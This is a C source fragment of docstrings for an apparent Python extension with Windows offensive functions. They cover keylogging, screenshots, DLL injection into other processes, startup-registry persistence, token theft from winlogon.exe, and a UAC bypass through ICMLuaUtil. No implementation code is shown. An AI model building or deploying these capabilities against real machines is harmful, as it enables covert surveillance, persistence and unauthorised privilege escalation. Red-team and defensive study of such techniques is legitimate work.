#define PY_SSIZE_T_CLEAN
#include <Python.h>

PyDoc_STRVAR(
    keylog_to_file_doc,
    "keylog_to_file(path: str, /)\n"
    "--\n"
    "\n"
    "def keylog_to_file(path: str)\n"
    "Start keylogging into a file.");

PyDoc_STRVAR(
    screenshot_doc,
    "screenshot(path: str, /)\n"
    "--\n"
    "\n"
    "def screenshot(path: str)\n"
    "Save screenshot to path.");

PyDoc_STRVAR(
    get_pid_by_name_doc,
    "get_pid_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "def get_pid_by_name(name: str)\n"
    "Return the first process's pid that matches name(use wcsicmp(from start, allow partial"
    " case insensetive)).");

PyDoc_STRVAR(
    get_pids_by_name_doc,
    "get_pids_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "def get_pids_by_name(name: str)\n"
    "Return a list of processes's pid that matches name(use wcsicmp(from start, allow partial"
    " case insensetive)).");

PyDoc_STRVAR(
    remote_thread_injection_doc,
    "remote_thread_injection(dll_path: str, pid: int, /)\n"
    "--\n"
    "\n"
    "def remote_thread_injection(dll_path: str, pid: int)\n"
    "Inject dll to target process.");

PyDoc_STRVAR(
    set_startup_reg_doc,
    "set_startup_reg(key: str, path: str, /)\n"
    "--\n"
    "\n"
    "def set_startup_reg(key: str, path: str)\n"
    "Set an entry in startup registry for the executable specified by path.");

PyDoc_STRVAR(
    delete_startup_reg_doc,
    "delete_startup_reg(key: str, /)\n"
    "--\n"
    "\n"
    "def delete_startup_reg(key: str)\n"
    "Delete an entry in startup registry");

PyDoc_STRVAR(
    get_username_doc,
    "get_username()\n"
    "--\n"
    "\n"
    "def get_username()\n"
    "return the user name of current thread's token.");

PyDoc_STRVAR(
    elevate_thread_doc,
    "elevate_thread(pid: int, /)\n"
    "--\n"
    "\n"
    "def elevate_thread(pid: int)\n"
    "Steal pid's credential and use for current thread.\n"
    "if no arg is specified, it targets at winlogon.exe.");

PyDoc_STRVAR(
    elevate_execute_doc,
    "elevate_execute(program_path: str, cmd: str, pid: int = 0, /)\n"
    "--\n"
    "\n"
    "def elevate_execute(program_path: str, cmd: str, pid: int = 0)\n"
    "Steal pid's credential and execute specified program.\n"
    "if no arg is specified, it targets at winlogon.exe.\n"
    "program_path can be omitted and included in cmd");

PyDoc_STRVAR(
    bypass_uac_exec_doc,
    "bypass_uac_exec(program_path: str, cmd: str, /)\n"
    "--\n"
    "\n"
    "def bypass_uac_exec(program_path: str, cmd: str)\n"
    "Bypass UAC via ICMLuaUtils COM interface.\n"
    "Requires that caller and target are both Microsoft signed.\n"
    "program_path can be omitted and included in cmd");
